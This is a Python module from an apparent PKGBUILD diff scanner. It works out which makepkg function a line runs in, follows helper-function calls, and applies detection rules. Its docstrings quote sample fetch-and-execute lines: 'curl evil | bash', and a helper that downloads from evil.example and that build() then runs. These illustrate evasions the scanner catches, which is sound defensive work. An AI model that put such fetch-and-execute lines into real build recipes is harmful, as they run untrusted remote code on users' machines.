"""Extracted from rules.py: _scope."""

import re
from functools import lru_cache
import threading
from ..config import load_rules
from ..deps import _strip_comment
from ..file_kinds import shell_lines
from ..findings import stamp
from ..line_lex import lex_lines
from ..tokenizer import (
    clean_lines,
    strip_boms,
)
from ._clamp import _COMMENT_OR_DEP_RE, _DEP_DECLARATION_RE, _is_message_line, _to_pairs, clamp, filter_raw_lines
from ._compiled import _compiled, resolve_generated_patterns

__all__ = ['ScopeResolver', '_CLASSIFY_ENTRIES', '_FUNCTION_CLOSE_RE', '_FUNCTION_NAME_CLASS', '_FUNCTION_NAME_RE', '_FUNCTION_OPEN_RE', '_blank_quoted', '_caller_closure_map', '_classified', '_classify_caller_closure', '_classify_enclosing_function', '_classify_line_context', '_classify_memo', '_enclosing_function_map', '_enclosing_function_map_cached', '_function_bodies', '_inline_body', '_scope_matches', '_starts_a_new_file', 'apply_rules']

_FUNCTION_NAME_CLASS = r"[A-Za-z0-9_@.+][A-Za-z0-9_@.+-]*"

_FUNCTION_OPEN_RE = re.compile(
    rf"^\s*(?:function\s+{_FUNCTION_NAME_CLASS}\s*(?:\(\s*\))?"
    rf"|{_FUNCTION_NAME_CLASS}\s*\(\s*\))\s*\{{"
)

_FUNCTION_CLOSE_RE = re.compile(r"^\s*\}")

_FUNCTION_NAME_RE = re.compile(
    rf"^\s*(?:function\s+({_FUNCTION_NAME_CLASS})\s*(?:\(\s*\))?"
    rf"|({_FUNCTION_NAME_CLASS})\s*\(\s*\))\s*\{{"
)

_HUNK_FUNCTION_RE = re.compile(
    r"^@@ -\d+(?:,\d+)? \+\d+(?:,\d+)? @@\s*(.*)$"
)

def _starts_a_new_file(line: str, previous: str) -> bool:
    """True when *line* begins a new file's section of the diff.

    A hunk shows part of a file, not all of it, so a `package() {` whose
    closing brace falls outside the hunk leaves the brace counter raised.
    It used to stay raised for the remainder of the diff, which placed
    every *subsequent file* inside that function: in the benign corpus a
    `.desktop` file's translated `Name[be]=` lines and a README's Spanish
    prose were both classified as `package()` body and scanned as shell.
    They are the bulk of what the crossfire family fired on.

    ``diff --git`` is unambiguous.  The ``---``/``+++`` pair is accepted
    too, for diffs generated without it, but only as a pair: a removed
    source line reading ``-- x`` appears in a diff as ``--- x``, and
    treating that alone as a header would reset scope on package content.
    """
    if line.startswith("diff --git "):
        return True
    return line.startswith("+++ ") and previous.startswith("--- ")

def _inline_body(stripped: str) -> bool:
    """True when a function opens and carries code on the same line.

    ``package() { curl evil | bash; }`` is a function body, but the
    opening line used to be classified before the depth counter moved,
    so it read as ``other`` and escaped every ``function_body`` scope.
    """
    match = _FUNCTION_OPEN_RE.search(stripped)
    if not match:
        return False
    rest = stripped[match.end():].strip()
    return bool(rest) and rest != "}"

def _classify_line_context(lines: list[str]) -> dict[int, str]:
    """Return {line_index: context_name} for each line.

    Contexts: ``"function_body"``, ``"message"``, or ``"other"``.
    """
    lines = shell_lines(lines)
    contexts: dict[int, str] = {}
    depth = 0
    previous = ""
    for i, lex in enumerate(lex_lines(lines, fragment=True)):
        line = lex.text
        if _starts_a_new_file(line, previous):
            depth = 0
            contexts[i] = "other"
            previous = line
            continue
        previous = line
        hunk = _HUNK_FUNCTION_RE.match(line)
        if hunk:
            if _FUNCTION_NAME_RE.match(hunk.group(1)):
                depth = 1
            contexts[i] = "other"
            continue
        if line.startswith("-"):
            contexts[i] = "other"
            continue
        code = lex.code.lstrip("+").lstrip()
        if _is_message_line(line):
            contexts[i] = "message"
        elif depth > 0 or _inline_body(code):
            contexts[i] = "function_body"
        else:
            contexts[i] = "other"
        if _FUNCTION_OPEN_RE.search(code):
            depth += 1
            # Opened and closed on one line, so it must not leave the
            # counter raised for everything that follows.
            if code.rstrip().endswith("}"):
                depth -= 1
        elif _FUNCTION_CLOSE_RE.search(code):
            depth = max(0, depth - 1)
    return contexts

_classify_memo = threading.local()

_CLASSIFY_ENTRIES = 4

def _classified(kind: str, lines: list[str], compute):
    cache = getattr(_classify_memo, "cache", None)
    if cache is None:
        cache = _classify_memo.__dict__.setdefault("cache", {})
    key = (kind, tuple(lines))
    hit = cache.get(key)
    if hit is None:
        hit = compute(lines)
        cache[key] = hit
        while len(cache) > _CLASSIFY_ENTRIES:
            del cache[next(iter(cache))]
    return dict(hit)

def _classify_enclosing_function(lines: list[str]) -> dict[int, str]:
    """Memoised wrapper: see :func:`_enclosing_function_map`."""
    return _classified("fn", lines, _enclosing_function_map)

def _enclosing_function_map(lines: list[str]) -> dict[int, str]:
    """Cached on the lines: the scope resolver asks once per rule family.

    A fresh dict is returned so a caller cannot mutate another's view.
    """
    return dict(_enclosing_function_map_cached(tuple(lines)))

@lru_cache(maxsize=8)
def _enclosing_function_map_cached(lines: tuple[str, ...]) -> dict[int, str]:
    """Return ``{line_index: enclosing_function_name}``.

    Lines outside any function are absent from the mapping.  A bare
    header line is not considered inside its own function, matching
    :func:`_classify_line_context`; a header that also carries code
    (``pkgver() { ...; }``) is, since that code really does run there.
    """
    lines = tuple(shell_lines(list(lines)))
    enclosing: dict[int, str] = {}
    stack: list[str] = []
    previous = ""
    for i, lex in enumerate(lex_lines(lines, fragment=True)):
        line = lex.text
        if _starts_a_new_file(line, previous):
            stack.clear()
            previous = line
            continue
        previous = line
        hunk = _HUNK_FUNCTION_RE.match(line)
        if hunk:
            match = _FUNCTION_NAME_RE.match(hunk.group(1))
            if match:
                stack = [(match.group(1) or match.group(2))]
            continue
        if line.startswith("-"):
            continue
        code = lex.code.lstrip("+").lstrip()
        match = _FUNCTION_NAME_RE.search(code)
        name = (match.group(1) or match.group(2)) if match else None
        if stack:
            enclosing[i] = stack[-1]
        elif match and _inline_body(code):
            # Code sharing the line with its own `pkgver() {` header is
            # inside that function, so a scope naming it must match.
            enclosing[i] = name
        if match:
            stack.append(name)
        elif _FUNCTION_OPEN_RE.search(code):
            stack.append("")
        if _FUNCTION_OPEN_RE.search(code):
            if code.rstrip().endswith("}") and stack:
                stack.pop()
        elif _FUNCTION_CLOSE_RE.search(code) and stack:
            stack.pop()
    return enclosing

def _function_bodies(lines: list[str]) -> dict[str, list[str]]:
    """Return ``{function_name: [body lines]}``, innermost owner wins."""
    bodies: dict[str, list[str]] = {}
    fn_map = _enclosing_function_map(lines)
    for index, name in fn_map.items():
        if name:
            bodies.setdefault(name, []).append(lines[index])
    return bodies

def _blank_quoted(line: str) -> str:
    """Blank literal text inside quotes, keeping command substitutions.

    A function name in a printed message is data.  The exception is
    ``$(...)`` and backticks: they execute even inside double quotes, so a
    double-quoted span that carries one is left intact rather than risk
    dropping a real call edge (``echo "$(_fetch)"`` calls ``_fetch``).
    Single quotes suppress substitution, so they are always blank.
    """
    out: list[str] = []
    i = 0
    n = len(line)
    while i < n:
        ch = line[i]
        if ch == "'":
            end = line.find("'", i + 1)
            end = n if end == -1 else end + 1
            out.append(" " * (end - i))
            i = end
        elif ch == '"':
            j = i + 1
            escaped = False
            while j < n:
                c = line[j]
                if escaped:
                    escaped = False
                elif c == "\\":
                    escaped = True
                elif c == '"':
                    break
                j += 1
            span = line[i:j + 1]
            if "$(" in span or "`" in span:
                out.append(span)
            else:
                out.append(" " * len(span))
            i = j + 1
        else:
            out.append(ch)
            i += 1
    return "".join(out)

def _caller_closure_map(lines: list[str]) -> dict[str, frozenset[str]]:
    """Return ``{function_name: names that transitively call it}``.

    A named scope such as ``scope = ["pkgver"]`` asks "does this code run
    during pkgver?", but it was answered with "is this line lexically
    inside a function spelled pkgver?".  The reviewed party chooses the
    spelling, so the gate was theirs:

        _fetch() { curl -s "$url" | sed ...; }
        pkgver() { _fetch; }

    is network access in pkgver by any definition that matters, and R051
    did not see it.  Following the calls costs one pass and takes the
    naming decision back.
    """
    bodies = _function_bodies(lines)
    if len(bodies) < 2:
        return {}
    names = sorted(bodies, key=len, reverse=True)
    # A call is the name in command position: at the start of a command,
    # not an assignment to it and not the tail of a longer word or path.
    call_re = re.compile(
        r"(?:^|[;&|(){}`]|\$\(|\s)(" + "|".join(re.escape(n) for n in names)
        + r")(?=[\s;&|)}`]|$)"
    )
    calls: dict[str, set[str]] = {}
    for name, body in bodies.items():
        found = set()
        for line in body:
            # Comments and quoted strings are not shell: a comment in
            # ``post_install()`` reading "a package name" made
            # ``callers['package'] = {post_install}``, so a genuine
            # ``chmod 4755`` in ``package()`` was labelled
            # "package(), called from post_install()" and scored as an
            # install hook.
            readable = _blank_quoted(
                _strip_comment(line.lstrip("+").lstrip())
            )
            for match in call_re.finditer(readable):
                found.add(match.group(1))
        found.discard(name)
        calls[name] = found

    # Invert, then close over the inverted edges: pkgver -> _fetch means
    # _fetch's callers include pkgver, and anything reaching pkgver.
    callers: dict[str, set[str]] = {name: set() for name in bodies}
    for caller, callees in calls.items():
        for callee in callees:
            callers[callee].add(caller)
    for _ in range(len(bodies)):
        changed = False
        for name, direct in callers.items():
            grown = set(direct)
            for caller in direct:
                grown |= callers.get(caller, set())
            grown.discard(name)
            if grown != direct:
                callers[name] = grown
                changed = True
        if not changed:
            break
    return {name: frozenset(found) for name, found in callers.items() if found}

def _classify_caller_closure(lines: list[str]) -> dict[str, frozenset[str]]:
    """Memoised wrapper: see :func:`_caller_closure_map`."""
    return _classified("callers", lines, _caller_closure_map)

class ScopeResolver:
    """Which makepkg function's execution reaches a given diff line.

    Every code rule outside the config-driven set asked the same question -
    "is this line inside build/prepare/check/package?" - and answered it with
    the *direct* enclosing function.  The reviewed party writes the function
    names, so that answer was theirs to change:

        _fetch() { curl -fsSL https://evil.example/x.sh -o "$srcdir/x.sh"; }
        build()  { _fetch; bash "$srcdir/x.sh"; }

    ``_fetch`` is not in ``_CRITICAL_FUNCTIONS``, so H016 and H082 both stood
    down and a working fetch-and-execute scored as an ordinary download.
    R051 had already been given the call closure for its ``pkgver`` scope;
    this is the same closure, shared, so the remaining rules stop being
    evadable by declaring a function.

    *extra_lines* is the current PKGBUILD when the caller has it.  A diff
    shows a hunk, so the ``build()`` that calls the added helper may not be
    in it at all; the graph is built from the whole recipe where possible
    while findings still come only from added lines.
    """

    __slots__ = ("_fn", "_callers")

    def __init__(self, lines: list[str], extra_lines: list[str] | None = None):
        self._fn = _classify_enclosing_function(lines)
        graph_lines = lines if not extra_lines else list(lines) + list(extra_lines)
        self._callers = _classify_caller_closure(graph_lines)

    def direct(self, index: int) -> str | None:
        """The function a line is lexically inside, or None."""
        return self._fn.get(index)

    def within(self, index: int, names) -> str | None:
        """The name in *names* whose execution reaches *index*, or None.

        The direct enclosing function wins when it qualifies, so an
        unremarkable line in ``build()`` still reports ``build``.
        """
        enclosing = self._fn.get(index)
        if enclosing is None:
            return None
        if enclosing in names:
            return enclosing
        for caller in sorted(self._callers.get(enclosing, ())):
            if caller in names:
                return caller
        return None

    def label(self, index: int, names) -> str:
        """How to name the scope in a finding, without overstating it.

        A finding that says ``build()`` when the line is in ``_fetch()``
        sends the reader to the wrong place, so the indirection is named.
        """
        enclosing = self._fn.get(index)
        reached = self.within(index, names)
        if reached is None or enclosing is None or reached == enclosing:
            return reached or (enclosing or "")
        # Callers render this as `f"{label}()"`, so the trailing parens land
        # on the reached function and this one supplies its own.
        return f"{enclosing}(), called from {reached}"

def _scope_matches(
    scope: list[str],
    index: int,
    ctx_map: dict[int, str],
    fn_map: dict[int, str],
    caller_map: dict[str, frozenset[str]] | None = None,
) -> bool:
    """Check *index* against a rule's scope.

    A scope entry matches either a line context (``function_body``,
    ``message``, ``other``), the name of the enclosing function
    (``pkgver``, ``package``, ...), or the name of a function that
    transitively calls the enclosing one - a helper invoked from
    ``pkgver()`` runs during pkgver whatever it is called.
    """
    ctx = ctx_map.get(index, "other")
    if ctx in scope:
        return True
    enclosing = fn_map.get(index)
    if enclosing is None:
        return False
    if enclosing in scope:
        return True
    if not caller_map:
        return False
    return bool(caller_map.get(enclosing, frozenset()).intersection(scope))

def apply_rules(
    resolved_strings: list[str],
    raw_diff_lines: list[str],
    rules: list[dict] | None = None,
    include_experimental: bool = False,
    line_map: dict[int, tuple[str, int]] | None = None,
    resolved_indices: list[int] | None = None,
    raw_indices: list[int] | None = None,
) -> list[dict]:
    """Match rules against diff lines and return triggered findings.

    *resolved_indices* maps each entry of *resolved_strings* back to its
    raw diff-line index (the third output of
    :func:`~trustsight.tokenizer.tokenize_and_resolve_indexed`).  Without
    it, resolved candidates are paired with their position in the resolved
    list, which is not a ``line_map`` key once assignment lines are
    omitted: resolved findings would carry no file/line (or, on a
    position collision, the wrong one).

    *raw_indices* does the same for the raw-line side: it parallels
    *raw_diff_lines* with the ``split_lines(diff_text)`` index each line
    came from (the first output of
    :func:`~trustsight.rules.get_raw_diff_lines_indexed`).  ``line_map``
    is keyed on split-lines positions, and *raw_diff_lines* joins
    continuations and drops blank lines, so without *raw_indices* a
    raw-line finding's own index is the wrong domain as soon as one such
    line precedes the match - it cited the wrong line, or across a file
    boundary the wrong file.
    """
    if rules is None:
        rules = list(load_rules())
    resolve_generated_patterns(rules)

    triggered = []
    # Both maps are built from the unclamped lines: context classification
    # is structural (does this line open a function?) and must not shift
    # because a long line was truncated for matching.
    ctx_map = _classify_line_context(raw_diff_lines)
    fn_map = _classify_enclosing_function(raw_diff_lines)
    caller_map = _classify_caller_closure(raw_diff_lines)

    # Candidate indices double as line_map keys, and line_map is keyed by
    # split_lines(diff_text) position while the raw candidates are indexed
    # into raw_diff_lines - a different domain once a continuation joins
    # or a blank line drops.  With raw_indices supplied, move every
    # raw-derived index into the split-lines domain up front, so scope
    # checks and file/line lookups agree.  A mismatched list is ignored:
    # better the legacy lookup than a crash inside matching.
    to_split = (
        raw_indices
        if raw_indices is not None and len(raw_indices) == len(raw_diff_lines)
        else None
    )
    if to_split is not None:
        ctx_map = {to_split[i]: ctx for i, ctx in ctx_map.items()}
        fn_map = {to_split[i]: fn for i, fn in fn_map.items()}

    # These three candidate lists do not vary per rule, but used to be
    # rebuilt inside the loop: with ~75 rules that was 75 filtering passes
    # over every line of the diff.  Built once and shared, read-only.
    # `a/b/../c` is `a/c` once the kernel opens it, and a raw-line rule
    # anchored on `$pkgdir/etc/cron.d/` read the traversal spelling as a
    # path into `/lib`.  Collapsed here as well as in the resolved text,
    # because the rules that own package-root staging read raw lines
    # deliberately - they need the quoting the tokenizer removes.
    filtered_raw = filter_raw_lines(raw_diff_lines)
    cleaned_raw = clean_lines([ln for _i, ln in filtered_raw])
    raw_candidates = [
        (to_split[i] if to_split is not None else i, cleaned)
        for (i, _ln), cleaned in zip(filtered_raw, cleaned_raw)
    ]
    added_candidates = [(i, ln) for i, ln in raw_candidates if ln.startswith("+")]
    if resolved_indices is not None:
        resolved_candidates = [
            (idx, clamp(line))
            for idx, line in zip(resolved_indices, resolved_strings)
        ]
    else:
        resolved_candidates = _to_pairs(resolved_strings)

    # Comments are filtered for raw-line rules by `filter_raw_lines` and were
    # not filtered for resolved ones, so a resolved rule read commented-out
    # text as code: `# curl ... | bash` scored R001 CRITICAL and H016 HIGH,
    # a Critical band on a line that runs nothing.
    #
    # Two lists rather than one filtered list, because `include_comments` is
    # exactly the opt-out: R012's payload is aimed at whoever *reads* the
    # file and is a comment nearly every time, so that rule needs the
    # unfiltered text and everything else needs the code.
    resolved_code_candidates = [
        (idx, line) for idx, line in resolved_candidates
        if not _COMMENT_OR_DEP_RE.match(line)
    ]

    # Comments and plain declarations are filtered out (or never resolved)
    # for every other rule, because a commented-out command does not run and
    # a `pkgdesc=` string is not executed.  R012 and R013 are the exceptions:
    # their payload is aimed at whoever *reads* the file - a reviewer, or the
    # model summarising it - so what matters is every line the new revision
    # shows a reader.  Removals are excluded: text this diff deletes is text
    # the reader will not see.
    # The BOM strip applies here too: R013 is the rule that reads this list
    # and the rule a byte-order mark used to fire, at FATAL.
    reader_pairs = _to_pairs(raw_diff_lines)
    stripped_reader = strip_boms([ln for _i, ln in reader_pairs])
    reader_candidates = [
        (to_split[i] if to_split is not None else i, stripped)
        for (i, ln), stripped in zip(reader_pairs, stripped_reader)
        if not ln.startswith("-") and not _DEP_DECLARATION_RE.match(ln)
    ]
    rules_by_id = {rule["id"]: rule for rule in rules}

    for rule in rules:
        if rule.get("enabled") is False:
            continue
        if rule.get("experimental") and not include_experimental:
            continue
        # H004 is a code rule (analysis/build.py).  A stale rules.toml from
        # before the migration would otherwise double-fire the regex form.
        if rule["id"] == "H004":
            continue

        match_target = rule.get("match_target", "raw_line")
        if match_target == "raw_line":
            candidates = (
                added_candidates if rule.get("added_only") else raw_candidates
            )
        else:
            candidates = resolved_code_candidates
        if rule.get("include_comments"):
            # For a raw-line rule the reader set *replaces* the default,
            # which drops the removed lines with it: a maintainer deleting a
            # hidden character must not score 100 for the cleanup.  For a
            # resolved rule it is additive - resolution still carries the
            # forms a variable hides.
            candidates = (
                reader_candidates if match_target == "raw_line"
                # The *unfiltered* resolved list here: a rule that opts into
                # comments must see them in the text resolution produced,
                # not only in the raw lines.
                else resolved_candidates + reader_candidates
            )

        compiled = _compiled(rule["pattern"], rule_id=rule.get("id", ""))
        if compiled is None:
            # A refused rule must not read as "this rule found nothing".
            # The verdict fails closed on the stage gap, so a pattern the
            # budget refused cannot yield a clean result.
            from ..coverage import note_stage_failure
            note_stage_failure(f"rule:{rule.get('id', '?')}")
            continue

        rule_scope = rule.get("scope") if match_target == "raw_line" else None

        for idx, item in candidates:
            if compiled.search(item):
                if rule_scope and not _scope_matches(
                    rule_scope, idx, ctx_map, fn_map, caller_map
                ):
                    continue
                # A generic rule may defer to a more precise rule on the
                # same command.  This preserves one finding per operation
                # without making evaluation order part of the rule contract.
                if any(
                    (other := rules_by_id.get(other_id))
                    and other.get("enabled") is not False
                    and (not other.get("experimental") or include_experimental)
                    and other.get("match_target", "raw_line") == match_target
                    and (other_compiled := _compiled(other["pattern"]))
                    and other_compiled.search(item)
                    and (
                        not other.get("scope")
                        or _scope_matches(
                            other["scope"], idx, ctx_map, fn_map, caller_map
                        )
                    )
                    for other_id in rule.get("exclude_if_matches", [])
                ):
                    continue
                finding = {
                    "rule_id": rule["id"],
                    "name": rule["name"],
                    "severity": rule["severity"],
                    "category": rule["category"],
                    "match": item[:100],
                }
                if "weight_override" in rule:
                    finding["weight_override"] = rule["weight_override"]
                if line_map and idx in line_map:
                    finding["file"], finding["line"] = line_map[idx]
                triggered.append(stamp(finding, f"{rule['name']}: {{match}}"))
                break

    return triggered
